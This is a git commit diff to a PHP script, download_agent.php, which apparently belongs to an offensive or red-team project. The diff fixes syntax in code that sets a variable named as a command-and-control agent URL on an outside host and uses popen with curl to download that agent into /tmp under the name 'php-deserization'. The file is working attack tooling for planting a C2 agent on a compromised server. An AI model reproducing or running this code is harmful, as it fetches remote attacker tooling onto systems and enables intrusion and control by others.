92ab60663076ad3865649a30611c31881dd09f15
fc-prashantsaini <92972358+fc-prashantsaini@users.noreply.github.com>
2024-06-03 17:44:44 +0530

    Update download_agent.php

--- download_agent.php
+++ download_agent.php
@@ -1,6 +1,6 @@
 <?php
-        $c2AgentUrl = "https://creds.tech/agents/chameleon"
-        $agentName = "php-deserization"
+        $c2AgentUrl = "https://creds.tech/agents/chameleon";
+        $agentName = "php-deserization";
         
         $command = sprintf("curl -o /tmp/%s %s", escapeshellarg($agentName), escapeshellarg($c2AgentUrl));
         $handle = popen($command, 'w');
@@ -11,5 +11,4 @@
         } else {
             echo "Failed to initiate download.";
         }
-    }
 ?>
